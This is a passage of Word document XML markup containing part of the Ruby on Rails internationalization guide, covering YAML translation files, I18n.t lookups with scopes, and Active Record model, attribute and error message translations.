        <w:t>For example a Ruby Hash providing translations can look like this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2928"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="587FAAC5" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="15442D08" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>{</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="73805076" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  :pt</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; {</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1C9BC6CA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    :foo</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; {</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1F25FA0B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      :bar</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "baz"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0EF6367D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    }</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="16951F9F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  }</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="71EAD1CD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="34C726CD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The equivalent </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>YAML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file would look like this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1920"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="5393FF2C" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="57285B24" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>pt:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="423D57A8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  foo:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4658B13B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    bar: baz</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6FB1138C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">As you see, in both cases the top level key is the locale. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:foo</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is a namespace key and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:bar</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is the key for the translation “baz”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7747D685" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Here is a “real” example from the Active Support </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>en.yml</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> translations </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>YAML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3720"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="05A5A5A0" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="19FDA57A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>en:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="32C20839" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  date:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="58C23072" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    formats:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2CC97908" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      default: "%Y-%m-%d"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4834E5CC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      short: "%b %d"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="30609E4C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      long: "%B %d, %Y"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3ECFA0B3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">So, all of the following equivalent lookups will return the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:short</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> date format </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>"%B %d"</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4968"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="4DE632F4" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3E54C7FF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>I18n.t 'date.formats.short'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55895ABA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>I18n.t 'formats.short', :scope</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :date</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="116A6A4A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>I18n.t :short, :scope</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'date.formats'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3A7C4EC2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>I18n.t :short, :scope</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; [:date, :formats]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="133DA99D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Generally we recommend using </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>YAML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as a format for storing translations. There are cases, though, where you want to store Ruby lambdas as part of your locale data, e.g. for special date formats.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FA09FE3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>5.1 Translations for Active Record Models</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1022959E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can use the methods </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Model.model_name.human</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Model.human_attribute_name(attribute)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to transparently look up translations for your model and attribute names.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19D2932F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>For example when you add the following translations:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7560"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="7EFA4104" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3E65422C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>en:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4DA8727E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  activerecord:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="523D23D0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    models:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E93CCD0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      user: Dude</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="572510C4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    attributes:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="44011ACD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      user:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="796DFE04" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>        login: "Handle"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0BB6CD9A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      # will translate User attribute "login" as "Handle"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="619D3FDF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Then </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>User.model_name.human</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> will return “Dude” and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>User.human_attribute_name("login")</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> will return “Handle”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68A82CF2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>5.1.1 Error Message Scopes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16D11F13" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Active Record validation error messages can also be translated easily. Active Record gives you a couple of namespaces where you can place your message translations in order to provide different messages and translation for certain models, attributes, and/or validations. It also transparently takes single table inheritance into account.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FA1E99A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This gives you quite powerful means to flexibly adjust your messages to your application’s needs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="318BA0A6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Consider a User model with a validation for the name attribute like this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4488"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="1B31A710" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="549EC2C4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>User &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="69A2B776" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  validates :name, :presence</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2265170A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5AE2CEC7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The key for the error message in this case is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:blank</w:t>
      </w:r>
      <w:r>
        <w:t>. Active Record will look up this key in the namespaces:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8040"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="0D3F6919" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4A238A73" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>activerecord.errors.models.[model_name].attributes.[attribute_name]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="508335AB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>activerecord.errors.models.[model_name]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="54AEBD6F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>activerecord.errors.messages</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4EA61CC5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>errors.attributes.[attribute_name]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55AA9C6A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>errors.messages</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="54AFAEB6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Thus, in our example it will try the following keys in this order and return the first result:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6360"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="5252FF3C" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="72CE52A8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>activerecord.errors.models.user.attributes.name.blank</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7045EF5D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>activerecord.errors.models.user.blank</w:t>
            </w:r>
          </w:p>
